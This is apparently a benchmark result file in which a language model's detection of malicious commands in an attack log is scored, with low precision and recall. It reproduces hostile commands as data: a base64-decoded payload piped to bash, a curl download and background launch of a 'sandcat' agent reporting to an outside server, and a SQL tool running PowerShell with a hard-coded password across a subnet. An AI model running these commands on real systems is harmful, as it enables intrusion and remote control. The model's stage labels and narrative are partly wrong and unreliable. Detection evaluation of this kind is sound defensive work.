@@ -1,0 +1,94 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c echo start:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sh -c kill -9 $(lsof -i:8080 -t) ; nohup timeout 600 python -m SimpleHTTPServer 8079 > /dev/null 2>&1 &",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "sh -c echo start:152d302e-4a34-48a4-b32b-16c0b3e73f15",
+        "stage": "Collection"
+      },
+      {
+        "command": "sh -c echo end:152d302e-4a34-48a4-b32b-16c0b3e73f15",
+        "stage": "Collection"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec \"cmd /c powershell.exe -ExecutionPolicy Bypass -C \\$ip=\\",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec \"cmd /c powershell.exe -ExecutionPolicy Bypass -C \\$ip=\\",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "sh -c echo start:99765d80-531b-400d-a6e8-d3220a4c1d18",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh 296059",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c if [[ -f /usr/bin/lsb_release ]];then /usr/bin/lsb_release -a | grep Description | awk -F : '{print $2}' | sed 's/^[ \t]*//g'; elif [[ -f /etc/system-release ]];then cat /etc/system-release | sed -n '1p'; else cat /etc/issue | sed -n '1p'; fi",
+        "stage": "Discovery"
+      }
+    ],
+    "narrative": "The attackers started by executing a bash command that decoded a base64 string and executed it as a new bash process, indicating an initial access attempt through exploitation of a vulnerability or phishing attack. Following this, they downloaded the `sandcat-linux` executable and made it executable, suggesting another initial access attempt via malware or backdoor delivery. They also created a web server using Python's built-in HTTP module to serve files over port 8079, likely for lateral movement and collection purposes. Additionally, they performed SQL queries using the `sqltool_amd64_upx` binary to gather sensitive information, such as user credentials, indicating credential access attempts. Furthermore, they conducted system discovery activities, including running commands like `lsb_release`, `awk`, and `sed` to collect system information.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19881,
+      "completion_tokens": 843,
+      "total_tokens": 20724,
+      "wall_clock_s": 10.838,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.18181818181818182,
+      "recall": 0.2857142857142857,
+      "f1": 0.2222222222222222,
+      "tp": 2,
+      "fp": 9,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.18181818181818182,
+      "recall": 0.2857142857142857,
+      "f1": 0.2222222222222222,
+      "tp": 2,
+      "fp": 9,
+      "fn": 5,
+      "recall_partial": 0.2857142857142857
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19881,
+      "completion_tokens": 843,
+      "total_tokens": 20724,
+      "wall_clock_s": 10.838,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
